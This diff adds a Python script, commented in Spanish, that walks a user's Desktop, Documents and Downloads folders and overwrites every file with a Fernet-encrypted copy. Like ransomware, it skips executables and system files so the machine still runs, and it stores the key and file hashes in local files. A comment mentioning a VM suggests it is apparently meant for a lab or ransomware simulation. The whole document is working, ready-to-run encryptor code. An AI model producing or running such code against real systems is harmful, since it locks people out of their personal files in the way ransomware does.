@@ -1,0 +1,68 @@
+import os
+from cryptography.fernet import Fernet
+import json
+import hashlib
+
+# Extensiones que NO deben ser encriptadas (archivos de sistema, ejecutables, etc.)
+EXTENSIONES_PROHIBIDAS = [
+    '.so', '.bin', '.exe', '.dll', '.o', '.a', '.ko', '.img', '.iso', '.tmp'
+]
+
+# Directorios seguros del usuario (en inglés, para VM en inglés)
+RUTAS_A_PROTEGER = [
+    os.path.expanduser("~/Desktop"),
+    os.path.expanduser("~/Documents"),
+    os.path.expanduser("~/Downloads")
+]
+
+def generar_key(path="key.key"):
+    key = Fernet.generate_key()
+    with open(path, "wb") as f:
+        f.write(key)
+    return key
+
+def cargar_key(path="key.key"):
+    with open(path, "rb") as f:
+        return f.read()
+
+def calcular_hash(data):
+    return hashlib.sha256(data).hexdigest()
+
+def encontrar_archivos(rutas):
+    archivos = []
+    for ruta in rutas:
+        for dirpath, _, filenames in os.walk(ruta):
+            for nombre in filenames:
+                _, ext = os.path.splitext(nombre)
+                if ext.lower() not in EXTENSIONES_PROHIBIDAS:
+                    archivos.append(os.path.join(dirpath, nombre))
+    return archivos
+
+def encriptar_archivos(archivos, key):
+    f = Fernet(key)
+    hashes = {}
+    for archivo in archivos:
+        try:
+            with open(archivo, "rb") as file:
+                datos = file.read()
+            hash_original = calcular_hash(datos)
+            datos_cifrados = f.encrypt(datos)
+            with open(archivo, "wb") as file:
+                file.write(datos_cifrados)
+            hashes[archivo] = hash_original
+            print(f"✔ Encriptado: {archivo}")
+        except Exception as e:
+            print(f"✘ Error con {archivo}: {e}")
+    return hashes
+
+if __name__ == "__main__":
+    print("[🔒] Iniciando encriptación con lista negra...")
+    key = generar_key()
+    archivos = encontrar_archivos(RUTAS_A_PROTEGER)
+    hashes = encriptar_archivos(archivos, key)
+    
+    # Guardar hashes
+    with open("hashes.json", "w") as f:
+        json.dump(hashes, f, indent=2)
+
+    print("\n[✅] Encriptación completa.")
